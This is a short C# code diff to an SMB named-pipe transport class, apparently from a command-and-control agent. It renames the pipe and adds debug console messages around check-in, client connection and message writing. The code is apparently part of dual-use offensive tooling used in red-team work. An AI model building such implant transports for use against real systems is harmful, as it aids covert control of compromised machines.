@@ -20,7 +20,7 @@ namespace Agent.Profiles
         private ICryptoManager crypt { get; set; }
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
-        private string pipeName = "pipename";
+        private string pipeName = "scottie_pipe";
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
         private PipeServer<SmbMessage> serverPipe { get; set; }
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
@@ -63,6 +63,7 @@ namespace Agent.Profiles
 
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
+            Console.WriteLine("Waiting for response.");
             //Wait for a checkin response message
             checkinAvailable.Wait();
 
@@ -103,6 +104,7 @@ namespace Agent.Profiles
         {
             if (!connected)
             {
+                Console.WriteLine("Waiting for client connection.");
                 onClientConnectedSignal.WaitOne();
             }
 
@@ -126,7 +128,7 @@ namespace Agent.Profiles
                     {
                         sm.final = true;
                     }
-
+                    Console.WriteLine($"Writing message. Parts: {parts.Count()}");
                     await this.serverPipe.WriteAsync(sm);
                 }
 
